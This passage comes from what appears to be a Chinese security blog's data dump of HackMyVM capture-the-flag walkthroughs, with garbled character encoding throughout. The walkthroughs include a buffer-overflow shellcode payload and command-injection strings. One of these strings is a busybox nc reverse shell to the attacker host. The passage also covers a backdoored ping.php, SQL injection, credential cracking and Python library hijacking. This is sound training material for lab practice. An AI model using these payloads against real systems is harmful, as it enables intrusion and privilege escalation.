ADMIN$[*] Uploading file hUqShSba.exe[*] Opening SVCManager on 172.22.13.6.....[*] Creating service PuTe on 172.22.13.6.....[*] Starting service PuTe.....[!] Press help for extra shell commands[-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codecMicrosoft Windows [ï¿½ æ±¾ 10.0.20348.1787][-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codec(c) Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½C:\\Windows\\system32 &gt; flag4 åœ¨ C:\\Users\\Administrator\\flag ä¸‹","categories":[{"name":"æ˜¥ç§‹äº‘é•œ","slug":"æ˜¥ç§‹äº‘é•œ","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Driftingblues9","slug":"HackmyVM-Driftingblues9","date":"2025-04-24T06:33:53.000Z","updated":"2025-04-24T06:52:45.750Z","comments":true,"path":"2025/04/24/HackmyVM-Driftingblues9/","permalink":"https://lvzhouhang.xyz/2025/04/24/HackmyVM-Driftingblues9/","excerpt":"","text":"ä¿¡æ¯æœé›†1234567â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:70:2e:5f PCS Systemtechnik GmbH192.168.31.159 08:00:27:b3:1b:96 PCS Systemtechnik GmbH 192.168.31.159å°±æ˜¯é¶æœº 12345678910111213â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.159 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 02:36 EDTNmap scan report for 192.168.31.159Host is up (0.0013s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE80/tcp open http111/tcp open rpcbind41157/tcp open unknownMAC Address: 08:00:27:B3:1B:96 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 13.08 seconds 80ç«¯å£æ‰«æç›®å½• 12345678910111213141516171819202122232425262728293031323334353637â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# gobuster dir -u &quot;http://192.168.31.159/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.jpg===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.159/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: php,txt,jpg[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/images (Status: 301) [Size: 317] [--&gt; http://192.168.31.159/images/]/.php (Status: 403) [Size: 279]/index.php (Status: 200) [Size: 5656]/docs (Status: 301) [Size: 315] [--&gt; http://192.168.31.159/docs/]/page (Status: 301) [Size: 315] [--&gt; http://192.168.31.159/page/]/header.php (Status: 200) [Size: 13]/admin (Status: 301) [Size: 316] [--&gt; http://192.168.31.159/admin/]/footer.php (Status: 500) [Size: 614]/license (Status: 301) [Size: 318] [--&gt; http://192.168.31.159/license/]/README.txt (Status: 200) [Size: 975]/js (Status: 301) [Size: 313] [--&gt; http://192.168.31.159/js/]/include (Status: 301) [Size: 318] [--&gt; http://192.168.31.159/include/]/backup (Status: 301) [Size: 317] [--&gt; http://192.168.31.159/backup/]/styles (Status: 301) [Size: 317] [--&gt; http://192.168.31.159/styles/]/INSTALL.txt (Status: 200) [Size: 1201]/.php (Status: 403) [Size: 279]/wysiwyg (Status: 301) [Size: 318] [--&gt; http://192.168.31.159/wysiwyg/]/server-status (Status: 403) [Size: 279]/mails (Status: 301) [Size: 316] [--&gt; http://192.168.31.159/mails/] ä»/README.txt å¾—çŸ¥æ˜¯ApPHPçš„æ¡†æ¶ï¼Œmailsé‡Œæœ‰è´¦å·å’Œå¯†ç ï¼Œå…¶ä»–çš„éƒ½æ²¡ä»€ä¹ˆç”¨ 123456789101112Hello _USER_NAME_!&lt;br&gt; &lt;br&gt;You or someone else asked for your login info on our site, _WEB_SITE_Your Login Info:------------------------&lt;br/&gt;Username: _USER_NAME_Password: _USER_PASSWORD_------------------&lt;br/&gt;Best regards,_WEB_SITE_ 1234567891011121314â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# searchsploit apphp-------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path-------------------------------------------------------------------------------------- ---------------------------------ApPHP MicroBlog 1.0.1 - Multiple Vulnerabilities | php/webapps/33030.txtApPHP MicroBlog 1.0.1 - Remote Command Execution | php/webapps/33070.pyApPHP MicroBlog 1.0.2 - Cross-Site Request Forgery (Add New Author) | php/webapps/40506.htmlApPHP MicroBlog 1.0.2 - Persistent Cross-Site Scripting | php/webapps/40505.txtApPHP MicroCMS 3.9.5 - Cross-Site Request Forgery (Add Admin) | php/webapps/40517.htmlApPHP MicroCMS 3.9.5 - Persistent Cross-Site Scripting | php/webapps/40516.txt-------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No Results php/webapps/33070.pyè·‘è¿™ä¸ªè„šæœ¬å°±è¡Œï¼Œç„¶åå¼¹å‡ºæ¥ä¸€ä¸ªshell ææƒåœ¨/var/www/html/include/base.inc.phpé‡Œæœ‰ç”¨æˆ·åå’Œå¯†ç  12345678910www-data@debian:/var/www/html/include$ cat base.inc.php&lt;?php // DATABASE CONNECTION INFORMATION define(&#x27;DATABASE_HOST&#x27;, &#x27;localhost&#x27;); // Database host define(&#x27;DATABASE_NAME&#x27;, &#x27;microblog&#x27;); // Name of the database to be used define(&#x27;DATABASE_USERNAME&#x27;, &#x27;clapton&#x27;); // User name for access to database define(&#x27;DATABASE_PASSWORD&#x27;, &#x27;yaraklitepe&#x27;); // Password for access to database define(&#x27;DB_ENCRYPT_KEY&#x27;, &#x27;p52plaiqb8&#x27;); // Database encryption key define(&#x27;DB_PREFIX&#x27;, &#x27;mb101_&#x27;); // Unique prefix of all table names in the database ?&gt; su clapton ææƒroothomeç›®å½•ä¸‹æœ‰inputä¸€ä¸ªç¨‹åºå’Œä¸€ä¸ªnote 1234567clapton@debian:~$ cat note.txtbuffer overflow is the way. ( Í¡Â° ÍœÊ– Í¡Â°)if you&#x27;re new on 32bit bof then check these:https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.htmlhttps://samsclass.info/127/proj/lbuf1.htm inputçš„ä¼ªcä»£ç  123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char dest[159]; // [esp+11h] [ebp-9Fh] BYREF if ( argc &lt;= 1 ) &#123; printf(&quot;Syntax: %s &lt;input string&gt;\\n&quot;, *argv); exit(0); &#125; strcpy(dest, argv[1]); return 0;&#125; äºŒè¿›åˆ¶æˆ‘å±å®ä¸ä¼šï¼Œçœ‹å¤§ä½¬wpäº† payloadï¼š 1for i in &#123;1..10000&#125;; do (./input $(python -c &#x27;print(&quot;A&quot; * 171 + &quot;\\xa0\\xe7\\x84\\xbf&quot; + &quot;\\x90&quot; * 1000 + &quot;\\x31\\xc9\\xf7\\xe1\\x51\\xbf\\xd0\\xd0\\x8c\\x97\\xbe\\xd0\\x9d\\x96\\x91\\xf7\\xd7\\xf7\\xd6\\x57\\x56\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot;)&#x27;)) ; done","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-WMessage","slug":"HackmyVM-WMessage","date":"2025-04-24T05:24:21.000Z","updated":"2025-04-29T03:23:27.609Z","comments":true,"path":"2025/04/24/HackmyVM-WMessage/","permalink":"https://lvzhouhang.xyz/2025/04/24/HackmyVM-WMessage/","excerpt":"","text":"ä¿¡æ¯æœé›†1234567â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:77:9d:8a PCS Systemtechnik GmbH192.168.31.158 08:00:27:06:63:ee PCS Systemtechnik GmbH 192.168.31.158å°±æ˜¯é¶æœºipåœ°å€ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.158 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 01:26 EDTNmap scan report for 192.168.31.158Host is up (0.00070s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:06:63:EE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds 80ç«¯å£å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œæ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼Œè¾“å…¥!mpstatå¯ä»¥æŸ¥çœ‹cupçš„çŠ¶æ€ï¼Œä½†æ˜¯è¾“å…¥å…¶ä»–å‘½ä»¤ä¸è¡Œï¼ŒçŒœæµ‹åªèƒ½è¿è¡Œmpstatå‘½ä»¤ç”¨åˆ†å·æ‹¼æ¥ä¸€ä¸‹å‘½ä»¤å‘ç°å¯ä»¥æ‰§è¡ŒæˆåŠŸ 12!mpstat;idServer: Linux 5.10.0-19-amd64 (MSG) 04/24/25 _x86_64_ (1 CPU) 05:30:02 CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 05:30:02 all 1.84 0.01 0.57 0.13 0.00 0.27 0.00 0.00 0.00 97.19 uid=33(www-data) gid=33(www-data) groups=33(www-data) åå¼¹ä¸€ä¸ªshell ææƒsudo -l 1234567www-data@MSG:~$ sudo -lMatching Defaults entries for www-data on MSG: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser www-data may run the following commands on MSG: (messagemaster) NOPASSWD: /bin/pidstat pidstatæœ‰ä¸€ä¸ª-eå‚æ•°å¯ä»¥ç›‘æ§æ‰§è¡Œçš„å‘½ä»¤ 1sudo -u messagemaster /bin/pidstat -e bash æ‰§è¡Œbashä¼šè‡ªåŠ¨é€€å‡ºï¼Œé‚£å°±å†™ä¸€ä¸ªå…¬é’¥è¿›å»ï¼Œhomeç›®å½•ä¸‹æ²¡æœ‰.sshå…ˆåˆ›å»ºä¸€ä¸ª.sshæ–‡ä»¶å¤¹ï¼Œç„¶åcpè¿›å»ä¸€ä¸ªauthorized_keys sshç™»å½• ææƒroot123456messagemaster@MSG:~$ sudo -lMatching Defaults entries for messagemaster on MSG: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser messagemaster may run the following commands on MSG: (ALL) NOPASSWD: /bin/md5sum å¯ä»¥æ‰§è¡Œmd5sumï¼Œåœ¨/var/www/æ–‡ä»¶å¤¹ä¸‹è¿˜æœ‰ä¸€ä¸ªROOTPASS,å¯ä»¥å°†rootçš„å¯†ç è¿›è¡Œmd5åŠ å¯† 1234messagemaster@MSG:/var/www$ ls -lltotal 8drwxrwxr-- 5 www-data www-data 4096 Nov 18 2022 html-rw-r----- 1 root root 12 Nov 21 2022 ROOTPASS ROOTPASSçš„å­—èŠ‚æ˜¯12ï¼Œè¯´æ˜ROOTçš„å¯†ç æ˜¯11ä½çš„å› ä¸ºæœ€åè¿˜æœ‰ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œå¯ä»¥å…ˆå°†rockyou.txté‡Œ11ä½çš„å¯†ç å…ˆå–å‡ºæ¥ 1grep -E &quot;^.&#123;11&#125;$&quot; /usr/share/wordlists/rockyou.txt &gt;pass.txt ç„¶åå¯¹æ¯è¡Œè¿›è¡Œmd5åŠ å¯† 12â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# for i in $(cat pass.txt);do echo $i|md5sum&gt;&gt;md5.txt ;done ï¼ˆæœ‰ç‚¹æ…¢ï¼‰ å†ç”¨pasteå°†rockyou.txtå’Œè¿™ä¸ªåˆå¹¶ 1paste -d &#x27;:&#x27; md5.txt /usr/share/wordlists/rockyou.txt &gt;pass.txt æœ€ågrepä¸€ä¸‹ 1grep &quot;85c73111b30f9ede8504bb4a4b682f48&quot; pass.txt å¯ä»¥å¾—åˆ°rootçš„å¯†ç æ˜¯Message5687","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Vinylizer","slug":"HackmyVM-Vinylizer","date":"2025-04-23T09:59:33.000Z","updated":"2025-05-08T13:54:30.872Z","comments":true,"path":"2025/04/23/HackmyVM-Vinylizer/","permalink":"https://lvzhouhang.xyz/2025/04/23/HackmyVM-Vinylizer/","excerpt":"","text":"ä¿¡æ¯æœé›†arp-scan -l 1234567â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:8d:42:52 PCS Systemtechnik GmbH192.168.31.156 08:00:27:6d:ec:17 PCS Systemtechnik GmbH 192.168.31.156 å°±æ˜¯é¶æœºåœ°å€ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.156 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 06:00 EDTNmap scan report for 192.168.31.156Host is up (0.0025s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:6D:EC:17 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 14.73 seconds 80ç«¯å£æ‰«æç›®å½•åªæœ‰ä¸€ä¸ªç™»å½•çš„login.phpä¸æ˜¯å¼±å£ä»¤ï¼Œå°è¯•sqlæ³¨å…¥ 123456789101112131415161718192021222324252627282930313233343536373839404142434445â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# sqlmap -u &quot;http://192.168.31.156/login.php&quot; --forms ___ __H__ ___ ___[&quot;]_____ ___ ___ &#123;1.8.11#stable&#125;|_ -| . [(] | .&#x27;| . ||___|_ [)]_|_|_|__,| _| |_|V... |_| https://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 06:04:37 /2025-04-23/[06:04:37] [INFO] testing connection to the target URLyou have not declared cookie(s), while server wants to set its own (&#x27;PHPSESSID=0om6k37fejc...nqdkc3ihnt&#x27;). Do you want to use those [Y/n][06:04:38] [INFO] searching for forms[1/1] Form:POST http://192.168.31.156/login.phpPOST data: username=&amp;password=&amp;login=do you want to test this form? [Y/n/q]&gt;Edit POST data [default: username=&amp;password=&amp;login=] (Warning: blank fields detected):do you want to fill blank fields with random values? [Y/n][06:04:38] [INFO] resuming back-end DBMS &#x27;mysql&#x27;[06:04:38] [INFO] using &#x27;/root/.local/share/sqlmap/output/results-04232025_0604am.csv&#x27; as the CSV results file in multiple targets modesqlmap resumed the following injection point(s) from stored session:---Parameter: username (POST) Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=GcYl&#x27; AND (SELECT 7194 FROM (SELECT(SLEEP(5)))aupQ) AND &#x27;jWGR&#x27;=&#x27;jWGR&amp;password=yoAl&amp;login=bpLA---do you want to exploit this SQL injection? [Y/n][06:04:39] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntu 22.04 (jammy)web application technology: Apache 2.4.52back-end DBMS: MySQL &gt;= 5.0.12[06:04:39] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#x27;/root/.local/share/sqlmap/output/results-04232025_0604am.csv&#x27;[*] ending @ 06:04:39 /2025-04-23/ å­˜åœ¨æ—¶é—´ç›²æ³¨ï¼Œå¯ä»¥æ³¨å…¥å‡ºæ¥ç”¨æˆ·å’Œå¯†ç  12345678Table: users[2 entries]+----+----------------------------------+-----------+----------------+| id | password | username | login_attempts |+----+----------------------------------+-----------+----------------+| 1 | 9432522ed1a8fca612b11c3980a031f6 | shopadmin | 0 || 2 | password123 | lana | 0 |+----+----------------------------------+-----------+----------------+ shopadminçš„å¯†ç è§£å¯† 19432522ed1a8fca612b11c3980a031f6:addicted2vinyl ç„¶åsshç™»å½• ææƒsudo -læŸ¥çœ‹ 1234567shopadmin@vinylizer:/usr/lib/python3$ sudo -lMatching Defaults entries for shopadmin on vinylizer: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser shopadmin may run the following commands on vinylizer: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124shopadmin@vinylizer:/usr/lib/python3$ cat /opt/vinylizer.py# @Name: Vinylizer# @Author: MrMidnight# @Version: 1.8import jsonimport randomdef load_albums(filename): try: with open(filename, &#x27;r&#x27;) as file: content = file.read() if not content: return [] albums = json.loads(content) except FileNotFoundError: albums = [] except json.JSONDecodeError: print(f&quot;Error decoding JSON_Config: &#123;filename&#125;.&quot;) albums = [] return albumsdef save_albums(filename, albums): with open(filename, &#x27;w&#x27;) as file: json.dump(albums, file, indent=None)def print_albums(albums): if not albums: print(&quot;No albums available.&quot;) else: print(&quot;Available Albums:&quot;) for album in albums: print(f&quot;- &#123;album[&#x27;name&#x27;]&#125;, Sides: &#123;&#x27;, &#x27;.join(album[&#x27;sides&#x27;])&#125;&quot;)def randomize_sides(album): sides = list(album[&#x27;sides&#x27;]) random.shuffle(sides) return &#123;&quot;name&quot;: album[&#x27;name&#x27;], &quot;sides&quot;: sides&#125;def randomize_vinyl(albums): if not albums: print(&quot;No albums available. Add one with &#x27;A&#x27;.&quot;) return None, None random_album = random.choice(albums) random_side = random.choice(random_album[&#x27;sides&#x27;]) return random_album[&#x27;name&#x27;], random_sidedef add_vinyl(albums, filename, name, num_sides): # Generate sides from A to the specified number sides = [chr(ord(&#x27;A&#x27;) + i) for i in range(num_sides)] # Add new vinyl new_album = &#123;&quot;name&quot;: name, &quot;sides&quot;: sides&#125; albums.append(new_album) save_albums(filename, albums) print(f&quot;Album &#x27;&#123;name&#125;&#x27; with &#123;num_sides&#125; sides added successfully.\\n&quot;)def delete_vinyl(albums, filename, name): for album in albums: if album[&#x27;name&#x27;] == name: albums.remove(album) save_albums(filename, albums) print(f&quot;Album &#x27;&#123;name&#125;&#x27; deleted successfully!\\n&quot;) return print(f&quot;Album &#x27;&#123;name&#125;&#x27; not found.&quot;)def list_all(albums): print_albums(albums)if __name__ == &quot;__main__&quot;: # Banner. Dont touch! print(&quot;o &#x27;O o\\nO o o O o\\no O o\\no o O\\nO O&#x27; O &#x27;OoOo. O o o O ooOO .oOo. `OoOo.\\n`o o o o O o O O o o OooO&#x27; o\\n `o O O O o O o o O O O O\\n `o&#x27; o&#x27; o O `OoOO Oo o&#x27; OooO `OoO&#x27; o\\nBy: MrMidnight o\\n OoO&#x27; \\n&quot;) config_file = &quot;config.json&quot; albums_config = load_albums(config_file) while True: choice = input(&quot;Do you want to (R)andomly choose a Album, (A)dd a new one, (D)elete an album, (L)ist all albums, or (Q)uit? : &quot;).upper() if choice == &quot;R&quot;: random_album, random_side = randomize_vinyl(albums_config) if random_album is not None and random_side is not None: print(f&quot;Randomly selected album: &#123;random_album&#125;, Random side: &#123;random_side&#125;\\n&quot;) elif choice == &quot;A&quot;: name = input(&quot;\\nEnter the name of the new album: &quot;) while True: try: num_sides = int(input(&quot;Enter the number of sides for the new album: &quot;)) break # Break the loop if the input is a integer except ValueError: print(&quot;\\nInvalid input. Please enter a valid integer for the number of sides.&quot;) add_vinyl(albums_config, config_file, name, num_sides) elif choice == &quot;D&quot;: name = input(&quot;\\nEnter the name of the album to delete: &quot;) delete_vinyl(albums_config, config_file, name) elif choice == &quot;L&quot;: list_all(albums_config) print(&quot;&quot;) elif choice == &quot;Q&quot;: print(&quot;\\nQuitting Vinylizer.&quot;) break else: print(&quot;Invalid Input!&quot;) è¿™ä¸ªpythonæ–‡ä»¶æ²¡ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼ŒæŸ¥æ‰¾æ˜¯å¦å­˜åœ¨åº“åŠ«æŒ 12find / -writable 2&gt;/dev/null/usr/lib/python3.10/random.py #å¯å†™ æ·»åŠ  12import osos.system(&quot;bash -p&quot;) ç„¶åsudoè¿è¡Œ","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"ç¾¤å‹æœº-Byxs20","slug":"ç¾¤å‹é¶æœº-Byxs20","date":"2025-04-20T10:00:19.000Z","updated":"2025-04-30T09:47:56.886Z","comments":true,"path":"2025/04/20/ç¾¤å‹é¶æœº-Byxs20/","permalink":"https://lvzhouhang.xyz/2025/04/20/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA-Byxs20/","excerpt":"","text":"ä¿¡æ¯æœé›†arp-scan -l æ‰«æé¶æœºip 12345678910â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:3d:c2:d3 PCS Systemtechnik GmbH192.168.31.149 08:00:27:9e:3d:15 PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 2.406 seconds (106.40 hosts/sec). 3 responded ç„¶ånmapæ‰«æä¸€ä¸‹å¼€æ”¾ç«¯å£ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.149Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-20 06:02 EDTNmap scan report for 192.168.31.149Host is up (0.0018s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:9E:3D:15 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds 80ç«¯å£gobusteræ‰«æä¸€ä¸‹ç›®å½• 1234567891011121314151617181920212223â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# gobuster dir -u &quot;192.168.31.149&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.jpg===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.149[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: php,txt,jpg[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.php (Status: 403) [Size: 279]/templates (Status: 301) [Size: 320] [--&gt; http://192.168.31.149/templates/]/template.php (Status: 200) [Size: 258]/conf (Status: 301) [Size: 315] [--&gt; http://192.168.31.149/conf/]/ping.php (Status: 200) [Size: 11] /template.phpæœ‰ä¸€ä¸ªè™šå‡çš„æ–‡ä»¶åŒ…å«ï¼ˆåé¢æ‹¿åˆ°shellä¹‹åæŸ¥çœ‹æ–‡ä»¶å¯ä»¥çŸ¥é“ï¼‰,ping.phpå¯ä»¥æ‰§è¡Œpingå‘½ä»¤ï¼Œfuzzä¸€ä¸‹å‚æ•° 12345678910111213â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arjun -u &quot;http://192.168.31.149/ping.php&quot; _ /_| _ &#x27; ( |/ /(//) v2.2.7 _/[*] Scanning 0/1: http://192.168.31.149/ping.php[*] Probing the target for stability[*] Analysing HTTP response for anomalies[*] Logicforcing the URL endpoint[âœ“] parameter detected: debug, based on: http headers[+] Parameters found: debug æ‰¾åˆ°ä¸€ä¸ªdebugå‚æ•°ï¼ˆå…¶å®ä¸€å¼€å§‹æ˜¯æƒ³fuzzå‡ºäº†æ‹¼æ¥ipçš„å‚æ•°çš„ï¼Œè¯¯æ‰“è¯¯æ’ï¼‰ï¼Œipçš„å‚æ•°å°±æ˜¯ip 1http://192.168.31.149/ping.php?debug&amp;ip=;ls å¯ä»¥æ‹¼æ¥æ‰§è¡Œå‘½ä»¤ 123456789101112131415161718192021222324252627282930313233343536#ping.php&lt;?php// diag.php - è¡¨é¢ä¸¥æ ¼æ ¡éªŒï¼Œå®é™…æš—è—è°ƒè¯•åé—¨$ip = $_GET[&#x27;ip&#x27;] ?? &#x27;&#x27;;// æš—æ¡©è§¦å‘æ¡ä»¶ï¼šåªè¦æºå¸¦debugå‚æ•°if(isset($_GET[&#x27;debug&#x27;]))&#123; // å…³é—­é”™è¯¯æç¤ºé¿å…æš´éœ²è·¯å¾„ error_reporting(0); // è¾“å‡ºè¯¦ç»†ç³»ç»Ÿä¿¡æ¯ï¼ˆä¼ªè£…æˆè°ƒè¯•æ¨¡å¼ï¼‰ echo &quot;&lt;pre&gt;&quot;; echo &quot;[*] Debug Mode Activated\\n&quot;; echo &quot;[+] Raw Command: ping -c 3 &quot; . $ip . &quot;\\n&quot;; // ç›´æ¥æ‹¼æ¥å‘½ä»¤æ‰§è¡Œï¼ˆæ— ä»»ä½•è¿‡æ»¤ï¼‰ system(&quot;ping -c 3 &quot; . $ip); // æ³„æ¼æ•æ„Ÿä¿¡æ¯ echo &quot;\\n\\n=== System Info ===\\n&quot;; echo &quot;PHP User: &quot; . shell_exec(&#x27;whoami&#x27;); echo &quot;PHP Version: &quot; . phpversion() . &quot;\\n&quot;; echo &quot;Disable Functions: &quot; . ini_get(&#x27;disable_functions&#x27;) . &quot;\\n&quot;; echo &quot;&lt;/pre&gt;&quot;; exit;&#125;// ä¸»åŠŸèƒ½ï¼šä¸¥æ ¼IPv4æ­£åˆ™éªŒè¯ï¼ˆæ— æ‡ˆå¯å‡»ï¼‰if (!preg_match(&#x27;/^(25[0-5]|2[0-4]\\d|1\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d&#123;2&#125;|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|1\\d&#123;2&#125;|[1-9]?\\d)$/&#x27;, $ip)) &#123; die(&quot;Invalid IP!&quot;);&#125;// å®‰å…¨æ‰§è¡Œå‘½ä»¤ï¼ˆæ— æ³¨å…¥å¯èƒ½ï¼‰$cmd = [&#x27;ping&#x27;, &#x27;-c&#x27;, &#x27;3&#x27;, $ip];system(escapeshellcmd(implode(&#x27; &#x27;, $cmd)));?&gt; ç„¶åç”¨busyboxåå¼¹shell 1;busybox%20nc%20192.168.31.129%204444%20-e%20/bin/bash æ‹¿åˆ°shellä¹‹åï¼ŒæŸ¥çœ‹sudo -l 12345678www-data@Byxs20:/tmp$ sudo -lMatching Defaults entries for www-data on Byxs20: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser www-data may run the following commands on Byxs20: (ALL : ALL) NOPASSWD: /usr/sbin/reboot å¯ä»¥æ‰§è¡Œreboot ä¸Šä¼ ä¸€ä¸ªpspyç›‘æ§ä¸€ä¸‹è¿›ç¨‹ 1www-data@Byxs20:/tmp$ busybox wget 192.168.31.129/pspy64 å¯ä»¥çœ‹åˆ°rootç”¨æˆ·å°†/var/www/html/conf/apache2.conf.bak å¤åˆ¶åˆ°äº†/etc/apache2/apache2.conf 12025/04/20 06:11:01 CMD: UID=0 PID=749 | /bin/sh -c cp /var/www/html/conf/apache2.conf.bak 